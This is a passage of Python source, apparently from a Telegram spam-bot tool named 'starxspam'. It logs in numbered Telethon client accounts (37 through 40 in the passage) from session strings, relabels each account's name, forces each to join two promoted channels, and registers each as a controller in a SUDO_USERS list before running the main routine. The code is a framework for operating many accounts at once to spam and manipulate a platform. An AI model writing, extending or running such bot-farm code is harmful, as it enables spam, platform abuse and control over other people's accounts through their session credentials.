        Star37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Star38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Star38.start()
            await Star38(functions.account.UpdateProfileRequest(last_name="#38"))
            botme = await Star38.get_me()
            await Star38(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star38(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 Not Found")
        session_name = "starxspam"
        Star38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        Star39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Star39.start()
            await Star39(functions.account.UpdateProfileRequest(last_name="#39"))
            botme = await Star39.get_me()
            await Star39(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star39(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 Not Found")
        session_name = "starxspam"
        Star39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Star40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Star40.start()
            await Star40(functions.account.UpdateProfileRequest(last_name="#40"))
            botme = await Star40.get_me()
            await Star40(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star40(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 Not Found")
        session_name = "starxspam"
        Star40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(StarX())
